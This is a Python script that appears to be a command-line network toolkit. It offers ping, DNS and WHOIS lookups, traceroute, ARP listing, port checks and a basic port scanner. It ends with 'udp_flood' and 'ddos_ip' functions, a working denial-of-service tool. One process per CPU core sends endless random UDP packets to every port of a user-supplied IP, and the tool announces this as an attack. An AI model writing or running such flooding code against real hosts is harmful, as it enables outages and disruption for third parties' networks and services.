
import multiprocessing
import platform
import random
import subprocess
import socket
import dns.resolver
import whois


def ping_test():
    target = input("Enter IP or domain to ping: ")
    param = "-n" if platform.system().lower() == "windows" else "-c"
    command = ["ping", param, "4", target]
    print(f"Pinging {target} with 4 packets...\n")
    try:
        output = subprocess.run(command, capture_output=True, text=True, check=True)
        print(output.stdout)
    except subprocess.CalledProcessError:
        print("Ping failed or host unreachable.")

def dns_lookup():
    domain = input("Enter domain for DNS lookup: ")
    print(f"Looking up DNS records for {domain}...\n")
    try:
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            print("IP Address:", rdata.to_text())
    except Exception as e:
        print("DNS Lookup failed:", e)

def port_scan():
    target = input("Enter IP or domain to scan ports: ")
    print(f"Starting port scan on {target} (common ports)...\n")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 8080]
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        try:
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"Port {port} is open")
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
        finally:
            sock.close()

def whois_lookup():
    domain = input("Enter domain for WHOIS lookup: ")
    print(f"Fetching WHOIS info for {domain}...\n")
    try:
        w = whois.whois(domain)
        print(w)
    except Exception as e:
        print("WHOIS lookup failed:", e)

def traceroute():
    target = input("Enter IP or domain to traceroute: ")
    command = ["tracert" if platform.system().lower() == "windows" else "traceroute", target]
    print(f"Tracing route to {target}...\n")
    try:
        output = subprocess.run(command, capture_output=True, text=True, check=True)
        print(output.stdout)
    except Exception as e:
        print("Traceroute failed:", e)

def reverse_dns_lookup():
    ip = input("Enter IP for reverse DNS lookup: ")
    try:
        host = socket.gethostbyaddr(ip)
        print(f"Reverse DNS: {host[0]}")
    except Exception as e:
        print("Reverse DNS lookup failed:", e)

def check_open_port():
    target = input("Enter IP or domain to check port: ")
    try:
        port = int(input("Enter port number to check: "))
    except ValueError:
        print("Invalid port number.")
        return
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port} is open on {target}")
        else:
            print(f"Port {port} is closed on {target}")
    except Exception as e:
        print(f"Error checking port: {e}")
    finally:
        sock.close()

def local_network_scan():
    print("Local network scan is platform dependent and simplified here.")
    try:
        if platform.system().lower() == "windows":
            command = ["arp", "-a"]
        else:
            command = ["arp", "-a"]
        output = subprocess.run(command, capture_output=True, text=True, check=True)
        print(output.stdout)
    except Exception as e:
        print("Local network scan failed:", e)

def port_forwarding_check():
    target = input("Enter the public IP or domain to check port forwarding: ")
    port = input("Enter the port number to check: ")
    try:
        port = int(port)
    except ValueError:
        print("Port must be a number.")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)

    try:
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port} on {target} is OPEN (port forwarding works).")
        else:
            print(f"Port {port} on {target} is CLOSED (port forwarding might not be set).")
    except Exception as e:
        print(f"Error checking port forwarding: {e}")
    finally:
        sock.close()

def udp_flood(target_ip, port_start=1, port_end=65535, packet_size=1024):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(packet_size)

    while True:
        for port in range(port_start, port_end):
            try:
                sock.sendto(data, (target_ip, port))
            except:
                continue

def ddos_ip():
    target = input("Enter the target ip: ").strip()
    cpu_count = multiprocessing.cpu_count()

    print(f"[INFO] Attacking {target} using {cpu_count} proceses...")
    print("[INFO] Press Ctrl+C to stop the attack]")

    processes = []
    for _ in range(cpu_count):
        p = multiprocessing.Process(target=udp_flood, args=(target,))
        p.start()
        processes.append(p)

    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[INFO] The attack was stoped")
